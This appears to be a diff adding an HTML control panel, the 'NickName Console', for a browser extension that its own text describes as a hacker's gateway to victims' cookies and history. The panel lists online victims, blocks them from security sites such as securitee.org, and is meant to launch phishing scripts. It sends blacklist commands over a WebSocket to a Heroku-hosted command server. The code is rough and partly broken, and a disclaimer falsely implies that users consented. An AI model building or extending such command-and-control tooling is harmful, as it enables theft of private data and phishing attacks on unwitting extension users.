@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SpeedDemon</title>
+    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
+	<script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
+	<link href="style1.css" rel="stylesheet">
+  </head>
+
+  
+
+  <body>
+
+	<!-- Logo And Name -->
+	<div class = "jumbotron">
+		<h1 class = "display-4">NickName Console</h1>
+		<p class = "lead">
+			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
+		</p>
+		<hr class="my-4">
+		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
+	</div>  
+
+	<div class = "ml-5">
+
+
+	<!-- List of Online Victims -->
+	<h4>User IDs (Click an ID for more info on the user.)</h4>
+
+	<script>
+        window.userCount = 0;   // Declare a global variable
+        //This global var is used to give each new user added a different id
+    </script>
+
+	<table class = "table">
+		<thead>
+			<tr>
+				<th scope="col">ID</th>
+				<th scope="col">Status</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<script>
+	        		userCount++;
+	        		//Change count each time a new user is added
+	        	</script>
+	        	<td><a id=0 class="user-link" href="infoPage.html" onclick="idClick(this.id)" ></a></td>
+	        	<script>
+					var id = Math.floor((Math.random() * 10000) + 1); 
+					//Random val for now, later will be an unknown val received from server
+
+					document.getElementById(0).innerHTML = id; //Display the user id
+					document.getElementById(0).id = userCount; //set the link's id to current count value  
+				</script>
+				<td>Online</td>
+			</tr>
+			<tr>
+				<script>
+	        		userCount++;
+	        		//Change count each time a new user is added
+	        	</script>
+	        	<td><a id=0 class="user-link" href="infoPage.html" onclick="idClick(this.id)" ></a></td>
+	        	<script>
+					var id = Math.floor((Math.random() * 10000) + 1); 
+					//Random val for now, later will be an unknown val received from server
+
+					document.getElementById(0).innerHTML = id; //Display the user id
+					document.getElementById(0).id = userCount; //set the link's id to current count value  
+				</script>
+				<td>Online</td>
+			</tr>
+			<tr>
+				<script>
+	        		userCount++;
+	        		//Change count each time a new user is added
+	        	</script>
+	        	<td><a id=0 class="user-link" href="infoPage.html" onclick="idClick(this.id)" ></a></td>
+	        	<script>
+					var id = Math.floor((Math.random() * 10000) + 1); 
+					//Random val for now, later will be an unknown val received from server
+
+					document.getElementById(0).innerHTML = id; //Display the user id
+					document.getElementById(0).id = userCount; //set the link's id to current count value  
+				</script>
+				<td>Online</td>
+			</tr>
+		</tbody>
+	</table>	
+	<!-- Spacing things Out -->
+	<br>
+
+
+	<!-- Adding Blacklisted Site -->
+	<h4>Add Site to Blacklist Here</h4>
+	<input type="text" class="form-control blacklist" placeholder="URL">
+	<button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>
+
+	<br><br><br>
+
+	<h4>Blacklisted Sites</h4>
+	<ul class = "list-group">
+		<li class="list-group-item">securitee.org</li>
+	</ul>
+
+	<script>
+	    function blackList(){
+	        var URL = document.getElementById(text);
+	        var HOST = 'wss://projectnickname123.herokuapp.com';
+	        var ws = new WebSocket(HOST);
+	        var jsonPackage = {id: 0, type:'list', addString: URL};
+	        ws.send(JSON.stringify(jsonPackage));
+	    }
+	</script>
+
+	<script>
+		function idClick(count){		
+			localStorage.setItem("id", document.getElementById(count).innerHTML);
+		}
+	</script>
+	
+	</div>
+	</div>
+  </body>
+
+</html>
